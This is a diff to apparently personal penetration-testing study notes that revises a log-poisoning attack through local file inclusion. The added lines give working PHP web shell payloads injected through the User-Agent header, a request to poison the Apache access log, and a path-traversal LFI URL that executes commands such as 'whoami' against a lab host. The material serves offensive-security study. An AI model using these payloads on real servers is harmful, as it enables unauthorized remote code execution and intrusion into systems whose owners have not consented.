@@ -164,12 +164,21 @@ Fuzzing for POST requests
 * modify and contaminate some log file
 * use LFI to trigger contaminated file
 
-1. Contaminate Logs
-` <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?> `
+1. Contaminate Logs modifying the request header
 
-2. access these logs externally (xampp on windows in this case)
+`User-Agent: <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?> `
 
-`http://10.11.0.xx/menu.php?file=c:\xampp\apache\logs\access.log&cmd=whoami`
+or 
+
+`User-Agent: <?php echo system($_GET['cmd']); ?>`
+
+2. send request to poison
+
+http://10.11.0.xx/
+
+3. access these logs externally (xampp on windows in this case) but without the poisoned header to execute it
+
+`http://10.11.0.xx/menu.php?file=../../../../../../../var/log/apache2/access.log&cmd=whoami`
 
 ## RFI
 
